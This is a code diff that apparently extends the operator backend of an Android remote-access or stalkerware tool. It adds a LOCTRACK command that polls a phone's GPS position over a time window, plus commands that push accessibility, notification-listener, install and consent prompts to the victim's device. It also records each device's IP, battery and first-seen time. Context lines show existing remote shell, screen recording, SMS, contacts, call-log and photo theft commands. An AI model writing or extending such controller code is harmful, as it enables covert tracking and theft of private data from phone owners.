@@ -338,6 +338,15 @@ def parse_photos(raw):
         out.append({"path": path, "date": date})
     return out
 
+def parse_loctrack(raw):
+    """Agent 'lat lng acc yyyy-MM-dd HH:mm:ss prov' lines -> row dicts."""
+    out = []
+    for ln in _strip_ok(raw):
+        m = re.match(r"^(-?\d+\.\d+) (-?\d+\.\d+) (\d+) (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}) (\S+)$", ln)
+        if m:
+            out.append({"lat": m.group(1), "lng": m.group(2), "acc": int(m.group(3)), "time": m.group(4), "prov": m.group(5)})
+    return out
+
 
 def parse_ls(raw):
     out = []
@@ -462,17 +471,43 @@ def op_update(cid, args):
     return {"uploaded": len(data), "text": res2 or res, "ok": bool(ok2)}
 
 
+def op_loctrack(cid, args):
+    """Track location over a time window: LOCTRACK <secs> <interval>."""
+    secs = max(1, min(600, _num(args, "secs", 60)))
+    ivl = max(2, min(120, _num(args, "interval", 10)))
+    ok, res = run_cmd(cid, f"LOCTRACK {secs} {ivl}", timeout=secs + 45, use_cache=False)
+    if not ok or res is None:
+        return {"error": res or "loctrack failed"}
+    rows = parse_loctrack(res)
+    if not rows:
+        return {"error": res if res.startswith("ERR") else "no fixes returned"}
+    return {"rows": rows, "secs": secs}
+
+
 def handle_op(op, cid, args, force_refresh):
     """Dispatch a structured operator op. Returns JSON-able dict."""
     op = str(op).strip().lower()
     fr = force_refresh
-
     if op == "screen":
         return op_screen(cid, args)
     if op == "rec":
         return op_rec(cid, args)
     if op == "update":
         return op_update(cid, args)
+    if op == "loctrack":
+        return op_loctrack(cid, args)
+    if op == "permreq":
+        perms = [str(p).strip() for p in (args.get("perms") or []) if str(p).strip()]
+        if not perms:
+            return {"error": "perms required"}
+        ok, res = run_cmd(cid, "PERMREQ " + ",".join(perms), use_cache=False)
+        return {"text": res or "", "ok": bool(ok)}
+    if op == "uireq":
+        what = str(args.get("what", "")).strip().lower()
+        if what not in ("accessibility", "notiflistener", "install", "consent", "battery"):
+            return {"error": "what must be accessibility|notiflistener|install|consent|battery"}
+        ok, res = run_cmd(cid, "UIREQ " + what, use_cache=False)
+        return {"text": res or "", "ok": bool(ok)}
 
     simple = {
         "ping": ("PING", None, "text"),
@@ -525,6 +560,7 @@ def handle_op(op, cid, args, force_refresh):
         "torch": "TORCH " + str(args.get("state", "")),
         "vibrate": "VIBRATE " + str(args.get("ms", 500)),
         "fastpoll": "FASTPOLL " + str(args.get("secs", 120)),
+        "gaction": "GACTION " + str(args.get("action", "")),
     }
     if op == "shell":
         ok, res = run_cmd(cid, "SHELL " + str(args.get("cmd", "")), use_cache=False)
@@ -571,6 +607,7 @@ def translate_terminal_cmd(text):
         "clipset": "CLIPSET", "torch": "TORCH", "vibrate": "VIBRATE",
         "fastpoll": "FASTPOLL", "smslog": "SMSLOG", "contacts": "CONTACTS",
         "smsin": "SMSIN", "calllog": "CALLLOG", "notifs": "NOTIFS", "photos": "PHOTOS",
+        "loctrack": "LOCTRACK", "permreq": "PERMREQ", "uireq": "UIREQ",
     }
     if op in mapping:
         base = mapping[op]
@@ -604,6 +641,11 @@ def snapshot():
                 "cid": cid,
                 "tag": core.alias_tag(cid),
                 "model": c.get("model") or "unknown",
+                "name": c.get("name") or "",
+                "sdk": c.get("sdk") or "",
+                "batt": c.get("batt", -1),
+                "ip": c.get("ip") or "",
+                "first_seen": c.get("first_seen") or 0,
                 "status": status,
                 "last_seen": c["last_seen"],
                 "last_seen_age": int(age),
